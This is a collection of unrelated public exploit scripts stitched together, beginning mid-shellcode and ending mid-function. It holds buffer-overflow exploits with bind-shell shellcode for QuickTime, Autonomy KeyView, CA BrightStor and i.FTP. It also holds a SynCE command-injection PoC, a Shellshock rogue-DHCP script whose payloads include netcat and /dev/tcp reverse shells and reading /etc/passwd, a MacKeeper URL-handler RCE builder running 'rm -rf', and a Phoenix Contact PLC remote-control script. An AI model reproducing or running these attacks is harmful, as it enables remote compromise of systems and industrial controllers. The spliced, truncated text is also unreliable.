shellcode += "\x4e\x56\x46\x42\x46\x42\x4b\x58\x45\x54\x4e\x53\x4b\x48\x4e\x57"
shellcode += "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x51\x4b\x38"
shellcode += "\x4f\x55\x42\x32\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x33\x4b\x58"
shellcode += "\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
shellcode += "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
shellcode += "\x46\x4f\x4b\x53\x46\x35\x46\x52\x4a\x42\x45\x57\x45\x4e\x4b\x48"
shellcode += "\x4f\x45\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x54"
shellcode += "\x4b\x48\x4f\x45\x4e\x41\x41\x30\x4b\x4e\x43\x30\x4e\x32\x4b\x58"
shellcode += "\x49\x48\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c\x41\x53\x4b\x4d"
shellcode += "\x46\x56\x4b\x38\x43\x54\x42\x43\x4b\x58\x42\x44\x4e\x30\x4b\x38"
shellcode += "\x42\x47\x4e\x41\x4d\x4a\x4b\x58\x42\x44\x4a\x30\x50\x55\x4a\x56"
shellcode += "\x50\x48\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
shellcode += "\x43\x45\x48\x56\x4a\x46\x43\x53\x44\x33\x4a\x46\x47\x37\x43\x57"
shellcode += "\x44\x33\x4f\x35\x46\x35\x4f\x4f\x42\x4d\x4a\x36\x4b\x4c\x4d\x4e"
shellcode += "\x4e\x4f\x4b\x53\x42\x45\x4f\x4f\x48\x4d\x4f\x35\x49\x38\x45\x4e"
shellcode += "\x48\x46\x41\x58\x4d\x4e\x4a\x30\x44\x30\x45\x35\x4c\x36\x44\x30"
shellcode += "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x35"
shellcode += "\x4f\x4f\x48\x4d\x43\x35\x43\x45\x43\x55\x43\x45\x43\x35\x43\x34"
shellcode += "\x43\x55\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x41"
shellcode += "\x4e\x45\x48\x36\x43\x45\x49\x58\x41\x4e\x45\x39\x4a\x56\x46\x4a"
shellcode += "\x4c\x31\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x31"
shellcode += "\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x42"
shellcode += "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x55\x45\x35\x4f\x4f\x42\x4d"
shellcode += "\x4a\x36\x45\x4e\x49\x54\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
shellcode += "\x42\x55\x46\x35\x46\x35\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x56"
shellcode += "\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x45\x4f\x4f\x48\x4d\x45\x45"
shellcode += "\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x56\x48\x36\x4a\x46\x43\x46"
shellcode += "\x4d\x46\x49\x58\x45\x4e\x4c\x56\x42\x35\x49\x55\x49\x52\x4e\x4c"
shellcode += "\x49\x38\x47\x4e\x4c\x56\x46\x54\x49\x58\x44\x4e\x41\x53\x42\x4c"
shellcode += "\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x52\x50\x4f\x44\x34\x4e\x32"
shellcode += "\x43\x49\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
shellcode += "\x44\x47\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x34\x4f\x4f"
shellcode += "\x48\x4d\x4b\x45\x47\x55\x44\x55\x41\x45\x41\x35\x41\x55\x4c\x36"
shellcode += "\x41\x30\x41\x35\x41\x55\x45\x45\x41\x45\x4f\x4f\x42\x4d\x4a\x56"
shellcode += "\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x56"
shellcode += "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x38\x47\x55\x4e\x4f"
shellcode += "\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x55\x4f\x4f\x42\x4d"
shellcode += "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x43\x55\x4f\x4f\x48\x4d"
shellcode += "\x4f\x4f\x42\x4d\x5a\x90"
shellcode += "\x90" * 90


def CreateQTL(sp):
       if sp == "1":
               JMPedi = '\xf5\x0c\xe5\x77' #Address of jmp edi from user32.dll
       elif sp == "2":
               JMPedi = '\x34\xd9\xe4\x77' #Address of jmp edi from user32.dll
       else:
               print 'Unsupported Service pack number'
               sys.exit(-1)

     #XML template from http://www.milw0rm.org/exploits/3064
       QTL  = "<?xml version=\"1.0\"?>"
       QTL += "<?quicktime type=\"application/x-quicktime-media-link\"?>"
       QTL += "<embed autoplay=\"true\" moviename=\"#{NEW}\" "
       QTL += "qtnext=\"#{YEAR}\" type=\"video/quicktime#{APPLE}\" "
       QTL += "src=\"rtsp://" + '\x90'*200 + shellcode + '\x90'*9000 + ':' + '\x90'*811 + JMPedi
       QTL += "\" />\n"

       fd = open('./exp.qtl', 'w')
       fd.write(QTL)
       fd.close()

if __name__ == '__main__':
       try:
               sp = sys.argv[1]
       except IndexError:
               print 'Usage: %s <version number>\n' % sys.argv[0]
               print 'Version: 1 => windows 2000 server SP0'
               print 'Version: 2 => windows 2000 server SP4'
               sys.exit(-1)

       CreateQTL(sp)

# milw0rm.com [2007-01-03]
source: http://www.securityfocus.com/bid/26604/info

Autonomy KeyView is prone to multiple buffer-overflow vulnerabilities.

Successfully exploiting these issues could allow an attacker to execute arbitrary code in the context of the user running the application.

Multiple applications incorporate the vulnerable KeyView component, so they are also considered vulnerable to these issues.

NOTE: These issues are similar to those described in BID 26175 (Autonomy KeyView Multiple Buffer Overflow Vulnerabilities) but affect a different component.

from sys import argv
from struct import pack

def createMaliciousFile(filename):
   seh_offset = 0x9c4
   jumper     = 0x06ad890d # pop pop ret ... CHANGE IT! (dll is rebased)

   shellcode = '\x90' * 0x400 + '\xCC' # nopsled and int 3

   content  = '\x00\x00' # header record type
   content += '\x1a\x00' # header length
   content += '\x05\x10\x04\x00\x00\x00\x00\x00\x09\x00\x00\x01'
   content += '\x01\x00\x30\x8d\x01\x0a\x00\x00\x00\x00\x00\x00\x00\x00'
   content += '\x1b\x00' # vulnerable record type
   payload  = ''
   payload += '\x90' * (seh_offset - 4) #others too
   payload += '\xeb\x06\x90\x90'  # jmp six bytes forward
   payload += pack('<L', jumper)
   payload += shellcode

   content += pack('<H', len(payload))
   content += payload

   fd = open(filename, 'wb')
   fd.write(content)
   fd.close()

if len(argv) is not 2:
   print '[-] Must specify a filename. Remember to change the pop pop ret address! :)'
else:
   createMaliciousFile(argv[1])
#!/usr/bin/python
# Remote exploit for buffer overflow vulnerability in CA BrightStor Arcserve
# tapeeng.exe service. Tested on windows 2000 SP4. Binds shell to TCP port 4443
#
# Winny M Thomas ;-)
# Author shall bear no responsibility for any screw ups caused by using this code


from impacket.dcerpc import transport, dcerpc
from impacket import uuid
import sys

def EnableDetailLogging(target):
       trans = transport.TCPTransport(target, 6502)
       #On some linux systems the following call to connect may fail due to
       #no support of settimeout in socket module. Comment out that line in
       #transport.py of impacket and run this script

       try:
               trans.connect()
       except:
               print 'Could not connect to target port; Target may not be running tapeeng'
               sys.exit(-1)

       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('62b93df0-8b02-11ce-876c-00805f842837','1.0')))

       #RPC request to enable detail logging
       request = '\x00\x04\x08\x0c'
       request += '\x02\x00\x00\x00'
       request += '\x00\x00\x00\x00'
       request += '\x00\x00\x00\x00'
       request += '\x00\x00\x00\x00'

       dce.call(43, request)

def DCEconnectAndExploit(target):
       trans = transport.TCPTransport(target, 6502)
       trans.connect()
       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('62b93df0-8b02-11ce-876c-00805f842837','1.0')))

       request  = '\x10\x09\xf9\x77'
       request += '\x41'*1130
       request += '\x90\x90\x90\x90\xeb\x08' #short jump into nops
       request += '\xd2\x7b\x57\x7c' #call ebx address from kernel32.dll
       request += '\x90' * 32
       #Shellcode to bind shell to TCP port 3334
       request += "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
       request += "\x13\xe9\x59\x23\xce\x83\xeb\xfc\xe2\xf4\x15\x33\xc8\x83"
       request += "\x01\xa0\xdc\x31\x16\x39\xa8\xa2\xcd\x7d\xa8\x8b\xd5\xd2"
       request += "\x5f\xcb\x91\x58\xcc\x45\xa6\x41\xa8\x91\xc9\x58\xc8\x87"
       request += "\x62\x6d\xa8\xcf\x07\x68\xe3\x57\x45\xdd\xe3\xba\xee\x98"
       request += "\xe9\xc3\xe8\x9b\xc8\x3a\xd2\x0d\x07\xe6\x9c\xbc\xa8\x91"
       request += "\xcd\x58\xc8\xa8\x62\x55\x68\x45\xb6\x45\x22\x25\xea\x75"
       request += "\xa8\x47\x85\x7d\x3f\xaf\x2a\x68\xf8\xaa\x62\x1a\x13\x45"
       request += "\xa9\x55\xa8\xbe\xf5\xf4\xa8\x8e\xe1\x07\x4b\x40\xa7\x57"
       request += "\xcf\x9e\x16\x8f\x45\x9d\x8f\x31\x10\xfc\x81\x2e\x50\xfc"
       request += "\xb6\x0d\xdc\x1e\x81\x92\xce\x32\xd2\x09\xdc\x18\xb6\xd0"
       request += "\xc6\xa8\x68\xb4\x2b\xcc\xbc\x33\x21\x31\x39\x31\xfa\xc7"
       request += "\x1c\xf4\x74\x31\x3f\x0a\x70\x9d\xba\x0a\x60\x9d\xaa\x0a"
       request += "\xdc\x1e\x8f\x31\x32\x95\x8f\x0a\xaa\x2f\x7c\x31\x87\xd4"
       request += "\x99\x9e\x74\x31\x3f\x33\x33\x9f\xbc\xa6\xf3\xa6\x4d\xf4"
       request += "\x0d\x27\xbe\xa6\xf5\x9d\xbc\xa6\xf3\xa6\x0c\x10\xa5\x87"
       request += "\xbe\xa6\xf5\x9e\xbd\x0d\x76\x31\x39\xca\x4b\x29\x90\x9f"
       request += "\x5a\x99\x16\x8f\x76\x31\x39\x3f\x49\xaa\x8f\x31\x40\xa3"
       request += "\x60\xbc\x49\x9e\xb0\x70\xef\x47\x0e\x33\x67\x47\x0b\x68"
       request += "\xe3\x3d\x43\xa7\x61\xe3\x17\x1b\x0f\x5d\x64\x23\x1b\x65"
       request += "\x42\xf2\x4b\xbc\x17\xea\x35\x31\x9c\x1d\xdc\x18\xb2\x0e"
       request += "\x71\x9f\xb8\x08\x49\xcf\xb8\x08\x76\x9f\x16\x89\x4b\x63"
       request += "\x30\x5c\xed\x9d\x16\x8f\x49\x31\x16\x6e\xdc\x1e\x62\x0e"
       request += "\xdf\x4d\x2d\x3d\xdc\x18\xbb\xa6\xf3\xa6\x19\xd3\x27\x91"
       request += "\xba\xa6\xf5\x31\x39\x59\x23\xce"

       dce.call(38, request)

if __name__ == '__main__':
       try:
               target = sys.argv[1]
       except IndexError:
               print 'Usage: %s <target ip>\n' % sys.argv[0]
               sys.exit(-1)

       EnableDetailLogging(target)
       DCEconnectAndExploit(target)

       print 'Exploit complete; Now telnet to port 4443 on target'

# milw0rm.com [2007-01-05]
source: http://www.securityfocus.com/bid/27178/info

SynCE is prone to a remote command-injection vulnerability because it fails to adequately sanitize user-supplied input data.

Attackers can exploit this issue to execute arbitrary commands in the context of the application, facilitating the remote compromise of affected computers.

SynCE 0.92 is vulnerable; other versions may also be affected. 

import socket, struct
import time
def AtoWChar(string):
    return ''.join([x+chr(0) for x in string])

HOST = '192.168.XXX.XXX'
PORT = 5679
c= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((HOST, PORT))
buf="\x00"*0x18
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+='\x30\x00\x00\x00'
buf+="\x00"*12
string=AtoWChar("&/usr/bin/touch /tmp/vulnerability")
buf+=string+"\x00\x00"+"\x00"*12
c.send(struct.pack("L",63+len(string))+buf+"\x00" )
- ---------------------------

NOTE: for this proof of concept to work, a script file is needed on the
"$home$/.synce/scripts" directory. Some linux distributions ship with
scripts on this directory by default.
#!/usr/bin/python
# Exploit Title: ShellShock dhclient Bash Environment Variable Command Injection PoC
# Date: 2014-09-29 
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 4.1
# Tested on: Debian, Ubuntu, Kali
# CVE: CVE-2014-6277, CVE-2014-6278, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187
from scapy.all import *

conf.checkIPaddr = False
fam,hw = get_if_raw_hwaddr(conf.iface)
victim_assign_ip = "10.0.1.100"
server_ip = "10.0.1.2"
gateway_ip = "10.0.1.2"
subnet_mask = "255.255.255.0"
dns_ip = "8.8.8.8"
spoofed_mac = "00:50:56:c0:00:01"
payload =   "() { ignored;}; echo 'moo'"
payload_2 = "() { ignored;}; /bin/nc -e /bin/bash localhost 7777"
payload_3 = "() { ignored;}; /bin/bash -i >& /dev/tcp/10.0.1.1/4444 0>&1 &"
payload_4 = "() { ignored;}; /bin/cat /etc/passwd"
payload_5 = "() { ignored;}; /usr/bin/wget http://google.com"
rce = payload_5
 
def toMAC(strMac):
    cmList = strMac.split(":")
    hCMList = []
    for iter1 in cmList:
        hCMList.append(int(iter1, 16))
    hMAC = struct.pack('!B', hCMList[0]) + struct.pack('!B', hCMList[1]) + struct.pack('!B', hCMList[2]) + struct.pack('!B', hCMList[3]) + struct.pack('!B', hCMList[4]) + struct.pack('!B', hCMList[5])
    return hMAC
 
def detect_dhcp(pkt):
#       print 'Process ', ls(pkt)
        if DHCP in pkt:
                # if DHCP Discover then DHCP Offer
                if pkt[DHCP].options[0][1]==1:
                        clientMAC = pkt[Ether].src
                        print "DHCP Discover packet detected from " + clientMAC
 
                        sendp(
                                Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
                                IP(src=server_ip,dst="255.255.255.255")/
                                UDP(sport=67,dport=68)/
                                BOOTP(
                                        op=2,
                                        yiaddr=victim_assign_ip,
                                        siaddr=server_ip,
                                        giaddr=gateway_ip,
                                        chaddr=toMAC(clientMAC),
                                        xid=pkt[BOOTP].xid,
                                        sname=server_ip
                                )/
                                DHCP(options=[('message-type','offer')])/
                                DHCP(options=[('subnet_mask',subnet_mask)])/
                                DHCP(options=[('name_server',dns_ip)])/
                                DHCP(options=[('lease_time',43200)])/
                                DHCP(options=[('router',gateway_ip)])/
                                DHCP(options=[('dump_path',rce)])/
                                DHCP(options=[('server_id',server_ip),('end')]), iface="vmnet1"
                        )
                        print "DHCP Offer packet sent"
 
                # if DHCP Request than DHCP ACK
                if pkt[DHCP] and pkt[DHCP].options[0][1] == 3:
                        clientMAC = pkt[Ether].src
                        print "DHCP Request packet detected from " + clientMAC
 
                        sendp(
                                Ether(src=spoofed_mac,dst="ff:ff:ff:ff:ff:ff")/
                                IP(src=server_ip,dst="255.255.255.255")/
                                UDP(sport=67,dport=68)/
                                BOOTP(
                                        op=2,
                                        yiaddr=victim_assign_ip,
                                        siaddr=server_ip,
                                        giaddr=gateway_ip,
                                        chaddr=toMAC(clientMAC),
                                        xid=pkt[BOOTP].xid
                                )/
                                DHCP(options=[('message-type','ack')])/
                                DHCP(options=[('subnet_mask',subnet_mask)])/
                                DHCP(options=[('lease_time',43200)])/
                                DHCP(options=[('router',gateway_ip)])/
                                DHCP(options=[('name_server',dns_ip)])/
                                DHCP(options=[('dump_path',rce)])/
                                DHCP(options=[('server_id',server_ip),('end')]), iface="vmnet1"
                        )
                        print "DHCP Ack packet sent"
 
def main():
        #sniff DHCP requests
        sniff(filter="udp and (port 67 or 68)", prn=detect_dhcp, iface="vmnet1")
 
if __name__ == '__main__':
        sys.exit(main())
#!/usr/bin/python
"""
SecureMac has released an advisory on a vulnerability discovered today with MacKeeper. The advisory titled MacKeeper URL handler remote code execution vulnerability and proof-of-concept (Zero-Day) contains the latest information including vulnerability, proof of concept and workaround solution, this report will be updated with the latest information: http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php <http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php>

Security Advisory:  MacKeeper URL handler remote code execution vulnerability and proof-of-concept (Zero-Day) Date issued: 05/07/2015

Risk: Critical (for users running MacKeeper)

A vulnerability has been discovered in MacKeeper, a utility program for OS X. MacKeeper was originally created by Ukrainian company ZeoBIT and is now distributed by Kromtech Alliance Corp. A flaw exists in MacKeeper's URL handler implementation that allows arbitrary remote code execution when a user visits a specially crafted webpage.

Security researcher Braden Thomas <https://twitter.com/drspringfield> has discovered a serious flaw in the way MacKeeper handles custom URLs that allows arbitrary commands to be run as root with little to no user interaction required. Mr. Thomas released a proof-of-concept (POC) demonstrating how visiting a specially crafted webpage in Safari causes the affected system to execute arbitrary commands – in this case, to uninstall MacKeeper. This flaw appears to be caused by a lack of input validation by MacKeeper when executing commands using its custom URL scheme.

If MacKeeper has already prompted the user for their password during the normal course of the program's operation, the user will not be prompted for their password prior to the arbitrary command being executed as root. If the user hasn't previously authenticated, they will be prompted to enter their username and password – however, the text that appears for the authentication dialog can be manipulated as part of the exploit and set to anything, so the user might not realize the consequences of this action. At this time it is not known if Mr. Thomas reached out to MacKeeper prior to publication of the vulnerability, but this is likely a zero-day exploit.

Apple allows OS X and iOS apps to define custom URL schemes and register them with the operating system so that other programs know which app should handle the custom URL scheme. Normally, this is used to define a custom communication protocol for sending data or performing a specific action (for example, clicking a telephone number link in iOS will ask if the user wants to dial that number, or clicking an e-mail address link in OS X will open Mail.app and compose a new message to that person). Apple's inter-application programming guide explicitly tells developers to validate the input received from these custom URLs in order to avoid problems related to URL handling. Additionally, Apple has provided information on the importance of input validation in their Secure Coding Guide <https://developer.apple.com/library/ios/documentation/Security/Conceptual/SecureCodingGuide/Articles/ValidatingInput.html#//apple_ref/doc/uid/TP40007246-SW5>.

Since this is a zero-day vulnerability that exists even in the latest version of MacKeeper (MacKeeper 3.4), it could affect an extremely large number of users, as a recent MacKeeper press release boasts that it has surpassed 20 million downloads worldwide <http://www.prweb.com/releases/2015/03/prweb12579604.htm>. MacKeeper is a controversial program <http://www.pcworld.com/article/2919292/apple-security-program-mackeeper-celebrates-difficult-birthday.html> in the Mac community, with many users voicing complaints about the numerous popups and advertisements they have encountered for MacKeeper. While the POC released by Mr. Thomas is relatively benign, the source code provided with the POC is in the wild and could easily be modified to perform malicious attacks on affected systems.

Workaround/Fix: Until MacKeeper fixes this vulnerability in their program, users can do a few different things to mitigate this threat. On OS X, clicking a link in Safari that uses a custom URL scheme will automatically open the program that is registered to handle that type of URL. Other browsers, such as Google's Chrome browser, will ask the user for permission before opening a link that uses an external protocol. Non-technical users could use a web browser other than Safari, in order to see an alert before a link could cause an arbitrary command to be executed. More technically-inclined users could remove the custom URL scheme handler from MacKeeper's Info.plist file.

Proof-of-concept: https://twitter.com/drspringfield/status/596316000385167361 <https://twitter.com/drspringfield/status/596316000385167361>
This is an initial advisory and will be updated at http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php <http://www.securemac.com/MacKeeper_Security_Advisory_Revised.php> as more information becomes available.
"""

import sys,base64
from Foundation import *
RUN_CMD = "rm -rf /Applications/MacKeeper.app;pkill -9 -a MacKeeper"
d = NSMutableData.data()
a = NSArchiver.alloc().initForWritingWithMutableData_(d)
a.encodeValueOfObjCType_at_("@",NSString.stringWithString_("NSTask"))
a.encodeValueOfObjCType_at_("@",NSDictionary.dictionaryWithObjectsAndKeys_(NSString.stringWithString_("/bin/sh"),"LAUNCH_PATH",NSArray.arrayWithObjects_(NSString.stringWithString_("-c"),NSString.stringWithString_(RUN_CMD),None),"ARGUMENTS",NSString.stringWithString_("Your computer has malware that needs to be removed."),"PROMPT",None))
print "com-zeobit-command:///i/ZBAppController/performActionWithHelperTask:arguments:/"+base64.b64encode(d)
#!/usr/bin/python
# Exploit Title		: i.FTP 2.21 Time Field SEH Exploit
# Exploit Author	: Revin Hadi S
# Vulnerability PoC	: Avinash Kumar Thapa "-Acid"
# PoC Link		: https://www.exploit-db.com/exploits/36847/
# Date			: 05/08/2015
# Vendor		: http://www.memecode.com/iftp.php
# Software Link		: http://www.memecode.com/data/iftp-win32-v2.21.exe
# Version		: 2.21
# Tested On		: Win 7 SP1 Eng & Win XP SP2
# Triggering Exploit	: Go to Schedule > Schedule download > {+} >Time field

# msfpayload windows/shell_bind_tcp LPORT=5698 R | msfencode -a x86 -e x86/alpha_upper BufferRegister=EAX -t c
shellcode = ("\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x56"
"\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30"
"\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
"\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b"
"\x4c\x4a\x48\x4c\x49\x33\x30\x53\x30\x53\x30\x35\x30\x4b\x39"
"\x4a\x45\x30\x31\x4e\x32\x55\x34\x4c\x4b\x31\x42\x46\x50\x4c"
"\x4b\x51\x42\x54\x4c\x4c\x4b\x46\x32\x35\x44\x4c\x4b\x54\x32"
"\x57\x58\x54\x4f\x38\x37\x31\x5a\x31\x36\x50\x31\x4b\x4f\x36"
"\x51\x59\x50\x4e\x4c\x47\x4c\x53\x51\x53\x4c\x44\x42\x56\x4c"
"\x47\x50\x49\x51\x48\x4f\x54\x4d\x43\x31\x39\x57\x4d\x32\x4a"
"\x50\x51\x42\x50\x57\x4c\x4b\x46\x32\x34\x50\x4c\x4b\x51\x52"
"\x37\x4c\x53\x31\x4e\x30\x4c\x4b\x51\x50\x54\x38\x4d\x55\x39"
"\x50\x32\x54\x50\x4a\x45\x51\x58\x50\x56\x30\x4c\x4b\x50\x48"
"\x44\x58\x4c\x4b\x36\x38\x47\x50\x33\x31\x48\x53\x5a\x43\x47"
"\x4c\x30\x49\x4c\x4b\x36\x54\x4c\x4b\x33\x31\x38\x56\x46\x51"
"\x4b\x4f\x50\x31\x49\x50\x4e\x4c\x4f\x31\x38\x4f\x44\x4d\x55"
"\x51\x48\x47\x46\x58\x4d\x30\x33\x45\x4b\x44\x44\x43\x53\x4d"
"\x4a\x58\x47\x4b\x43\x4d\x47\x54\x54\x35\x5a\x42\x30\x58\x4c"
"\x4b\x31\x48\x51\x34\x53\x31\x49\x43\x52\x46\x4c\x4b\x44\x4c"
"\x30\x4b\x4c\x4b\x36\x38\x45\x4c\x55\x51\x4e\x33\x4c\x4b\x55"
"\x54\x4c\x4b\x43\x31\x38\x50\x4b\x39\x57\x34\x37\x54\x37\x54"
"\x31\x4b\x51\x4b\x53\x51\x51\x49\x51\x4a\x46\x31\x4b\x4f\x4d"
"\x30\x31\x48\x51\x4f\x31\x4a\x4c\x4b\x55\x42\x5a\x4b\x4c\x46"
"\x31\x4d\x33\x58\x46\x53\x47\x42\x43\x30\x43\x30\x43\x58\x52"
"\x57\x42\x53\x36\x52\x31\x4f\x50\x54\x43\x58\x30\x4c\x52\x57"
"\x51\x36\x43\x37\x4b\x4f\x4e\x35\x38\x38\x4c\x50\x55\x51\x33"
"\x30\x35\x50\x46\x49\x4f\x34\x36\x34\x36\x30\x52\x48\x57\x59"
"\x4d\x50\x52\x4b\x53\x30\x4b\x4f\x58\x55\x46\x30\x50\x50\x36"
"\x30\x30\x50\x31\x50\x46\x30\x31\x50\x50\x50\x35\x38\x4b\x5a"
"\x44\x4f\x39\x4f\x4d\x30\x4b\x4f\x39\x45\x4c\x49\x48\x47\x50"
"\x31\x49\x4b\x46\x33\x52\x48\x43\x32\x55\x50\x32\x36\x50\x42"
"\x4c\x49\x4b\x56\x52\x4a\x52\x30\x36\x36\x31\x47\x43\x58\x39"
"\x52\x59\x4b\x57\x47\x32\x47\x4b\x4f\x39\x45\x50\x53\x46\x37"
"\x32\x48\x38\x37\x4b\x59\x56\x58\x4b\x4f\x4b\x4f\x39\x45\x31"
"\x43\x51\x43\x30\x57\x35\x38\x33\x44\x5a\x4c\x57\x4b\x4b\x51"
"\x4b\x4f\x49\x45\x51\x47\x4c\x49\x4f\x37\x33\x58\x33\x45\x42"
"\x4e\x50\x4d\x33\x51\x4b\x4f\x59\x45\x32\x48\x32\x43\x42\x4d"
"\x52\x44\x43\x30\x4c\x49\x5a\x43\x46\x37\x51\x47\x31\x47\x30"
"\x31\x4a\x56\x52\x4a\x34\x52\x50\x59\x31\x46\x4a\x42\x4b\x4d"
"\x53\x56\x39\x57\x57\x34\x31\x34\x47\x4c\x53\x31\x55\x51\x4c"
"\x4d\x31\x54\x46\x44\x52\x30\x38\x46\x55\x50\x51\x54\x46\x34"
"\x30\x50\x30\x56\x36\x36\x46\x36\x50\x46\x31\x46\x50\x4e\x56"
"\x36\x46\x36\x50\x53\x30\x56\x55\x38\x53\x49\x58\x4c\x37\x4f"
"\x4c\x46\x4b\x4f\x59\x45\x4d\x59\x4b\x50\x50\x4e\x46\x36\x50"
"\x46\x4b\x4f\x50\x30\x53\x58\x43\x38\x4d\x57\x45\x4d\x35\x30"
"\x4b\x4f\x59\x45\x4f\x4b\x5a\x50\x58\x35\x39\x32\x56\x36\x33"
"\x58\x39\x36\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x48\x55\x37\x4c"
"\x35\x56\x53\x4c\x54\x4a\x4d\x50\x4b\x4b\x4d\x30\x33\x45\x44"
"\x45\x4f\x4b\x47\x37\x42\x33\x32\x52\x52\x4f\x52\x4a\x35\x50"
"\x31\x43\x4b\x4f\x39\x45\x41\x41")

# Align Shellcode to EAX register
align = "\x58"*3		# POP EAX; POP EAX; POP EAX
align += "\x2d\x77\x77\x77\x77"	# SUB EAX, 0x77777777
align += "\x2d\x77\x33\x33\x33"	# SUB EAX, 0x33333377
align += "\x2d\x77\x22\x22\x22"	# SUB EAX, 0x22222277
align += "\x2d\x3b\x32\x33\x33"	# SUB EAX, 0x3333323b

buffer = "A"*300
buffer += "\x40\x75\x21\x40"	
buffer += "\x67\x59\x02\x10"	# /p/p/r Lgi.dll
buffer += "DOGE"*7		
buffer += align		
buffer += "\x43"*37		
buffer += shellcode

f = open("evil.txt", "wb")
f.write(buffer)
f.close()

#! /usr/bin/env python
'''
    # Exploit Title: Phoenix Contact ILC 150 ETH PLC Remote Control script
    # Date: 2015-05-19
    # Exploit Author: Photubias - tijl[dot]deneut[at]howest[dot]be
    # Vendor Homepage: https://www.phoenixcontact.com/online/portal/us?urile=pxc-oc-itemdetail:pid=2985330
    # Version: ALL FW VERSIONS
    # Tested on: Python runs on Windows, Linux
    # CVE : CVE-2014-9195

    Copyright 2015 Photubias(c)

    Written for Howest(c) University College

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

File name ControlPLC.py
written by tijl[dot]deneut[at]howest[dot]be
This POC will print out the current status of the PLC, continuously every 0.1 second, after 3 seconds it reverts (start becomes stop, stop becomes cold start), and stops after 5 seconds
Works on ILC 15x ETH, partly on RFC 43x, partly on ILC 39x
'''
import sys, socket, binascii, time, os, select, re

IP=''
infoport=1962
controlport=41100


## Defining Functions First
def send_and_recv(s,size,strdata):
    data = binascii.unhexlify(strdata) ## Convert to real HEX (\x00\x00 ...)
    s.send(data)
    ret = s.recv(4096)
    return ret

def doAction(s,strdata):
    ret = send_and_recv(s,1000,strdata)
    # In official state these are send, they do not seem to be needed
    send_and_recv(s,1000,packet1)
    send_and_recv(s,1000,packet2)
    send_and_recv(s,1000,packet2)
    ret = send_and_recv(s,1000,'010002000000020003000100000000000840')
    send_and_recv(s,1000,packet2)
    return ret

def initMonitor(s):
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002500000000000000d9ff4164652e52656d6f74696e672e53657276696365732e49466f726365536572766963653200')
    send_and_recv(s,1000,'010000000000240000000000000000004164652e52656d6f74696e672e53657276696365732e49466f7263655365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
